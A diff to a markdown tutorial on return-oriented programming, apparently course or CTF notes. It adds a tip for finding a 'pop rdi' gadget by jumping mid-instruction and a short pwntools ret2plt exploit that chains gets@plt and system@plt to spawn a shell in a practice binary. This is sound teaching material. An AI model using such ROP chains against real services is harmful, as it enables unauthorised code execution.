@@ -5,9 +5,16 @@ Fowllowing are the condition we need to fullfill before we start ROP:
 2. We can find gadgets, if PIE is open, we also should leak the address of gadgets!    
   
 ## How to find gadgets?
-`pop rax; ret` would be better than `mov rax, <val>` because the there would no the piece of value you want in binary.
+`pop rax; ret` would be better than `mov rax, <val>` because the there would no the piece of value you want in binary.  
 
-## ROP (find in `/file/rop`)
+Here comes an important concept when you try to find gadgets by hands:  
+```
+400732:  41 5f       pop r15
+400734:  c3          ret
+```
+You can try to return to `400733`. CPU would parse it `5f c3` as `pop rdi; ret;` :)
+
+## ROP (`/file/rop/`)
 ```c
 ...
 int main(){
@@ -69,7 +76,25 @@ Here we use six gadgets to make the syscall of execve. Let me explain gadgets on
 4. Gadget 4 is to give 0 to both rdx and rsi. In final step, rip point to gadget 5.  
 5. Gadget 5 is to give 59 to rax, then rip point to gadget 6.  
 6. Gadget 6, final gadget, make syscall.  
+
 Exploit: (`/file/rop/exp.py` run with python2)
+
+## ret2plt (`/file/ret2plt/`)
+This binary has less gadgets because it uses dynamic linking. However, we won't need to build ropchain piece by piece this time. There is plt function which can do what we want to do; therefore, this time we would ret2plt. To call `system('sh')`, I would like to call `gets@plt` to input the string(`sh`), then call `system@plt`. This time, exploit is much shorter :)
+```py
+...
+pop_rdi = 0x400733
+bss = 0x6010a0
+getsplt = 0x400530
+systemplt = 0x400520
+
+p = flat('a' * 0x38, pop_rdi, bss, getsplt, pop_rdi, bss, systemplt)
+
+r.sendlineafter(':D', p)
+r.interactive()
+```
+1. `gets()` would accept bss from rdi as its first parameter. Here, exploit would pop out a shell, then we can input our string `sh`, `gets` would help us to put the string to bss.
+2. `system()` would accept bss from rdi as its first parameter. system locates to bss and find `sh` in it.
   
 ## Practice  
 Kinds of ROP | practice link  
